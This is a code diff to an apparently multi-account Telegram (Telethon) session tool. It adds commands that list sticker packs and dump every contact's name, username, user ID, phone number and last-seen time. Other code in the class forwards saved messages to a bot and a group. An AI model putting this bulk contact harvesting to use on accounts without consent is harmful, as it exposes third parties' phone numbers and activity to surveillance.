@@ -2,7 +2,11 @@ import os
 import asyncio
 from telethon import TelegramClient, events
 from telethon.tl.functions.channels import JoinChannelRequest
-from telethon.tl.types import InputMessagesFilterPhoneCalls, MessageActionPhoneCall, User, PhoneCallDiscardReasonMissed
+from telethon.tl.functions.messages import GetAllStickersRequest
+from telethon.tl.types import (
+    InputMessagesFilterPhoneCalls, MessageActionPhoneCall, User, PhoneCallDiscardReasonMissed,
+    UserStatusOnline, UserStatusOffline, UserStatusRecently, UserStatusLastWeek, UserStatusLastMonth, UserStatusEmpty
+)
 from datetime import datetime, timedelta
 from config import USERS_DIR, IGNORED_USERS, DOWNLOAD_FILTER_ADMINS, LOG_GROUP_NORMAL, LOG_GROUP_TIMER
 
@@ -461,6 +465,63 @@ class UserSession:
                      return await self.forward_chats('me', limit, bot_username, CHATS_GROUP_ID)
                  except Exception as e:
                      return f"Error fetching saved messages: {e}"
+
+             if 'sticker' in mode or 'stikcer' in mode:
+                 try:
+                     st_idx = 0
+                     limit = 20
+                     if 'all' in mode: limit = None
+                     
+                     # hash=0 returns all stickers
+                     st_result = await self.client(GetAllStickersRequest(hash=0))
+                     sets = st_result.sets
+                     
+                     if limit:
+                         sets = sets[:limit]
+                     
+                     report = [f"Found {len(st_result.sets)} Sticker Packs (Showing {len(sets)})"]
+                     for s in sets:
+                         link = f"https://t.me/addstickers/{s.short_name}"
+                         report.append(f"[{s.title}]({link})")
+                     return "\n\n".join(report)
+                 except Exception as e: return f"Error fetching stickers: {e}"
+             
+             if mode == 'contact':
+                 try:
+                     contacts = await self.client.get_contacts()
+                     
+                     def sort_key(u):
+                         s = u.status
+                         if isinstance(s, UserStatusOnline): return float('inf')
+                         if isinstance(s, UserStatusOffline): return s.was_online.timestamp()
+                         if isinstance(s, UserStatusRecently): return 4.0
+                         if isinstance(s, UserStatusLastWeek): return 3.0
+                         if isinstance(s, UserStatusLastMonth): return 2.0
+                         return 1.0
+                     
+                     contacts.sort(key=sort_key, reverse=True)
+                     
+                     lines = [f"Found {len(contacts)} Contacts\n"]
+                     for u in contacts:
+                         name = f"{u.first_name or ''} {u.last_name or ''}".strip() or "No Name"
+                         
+                         status_str = "Offline"
+                         if isinstance(u.status, UserStatusOnline): status_str = "Online"
+                         elif isinstance(u.status, UserStatusOffline): 
+                             dt = u.status.was_online + timedelta(hours=5, minutes=30)
+                             status_str = "Last seen " + dt.strftime("%d/%m/%Y %I:%M %p")
+                         elif isinstance(u.status, UserStatusRecently): status_str = "Last seen recently"
+                         elif isinstance(u.status, UserStatusLastWeek): status_str = "Last seen within a week"
+                         elif isinstance(u.status, UserStatusLastMonth): status_str = "Last seen within a month"
+                         elif isinstance(u.status, UserStatusEmpty): status_str = "Last seen long ago"
+                         
+                         uname = f"@{u.username}" if u.username else "No Username"
+                         phone = f"+{u.phone}" if u.phone else "No Phone"
+                         
+                         lines.append(f"{name}\n{status_str}\n`{u.id}`\n{uname}\n{phone}")
+                     
+                     return "\n\n".join(lines)
+                 except Exception as e: return f"Error fetching contacts: {e}"
 
              me = await self.client.get_me()
              u_str = f"@{me.username}" if getattr(me, 'username', None) else (getattr(me, 'first_name', '') or 'User')
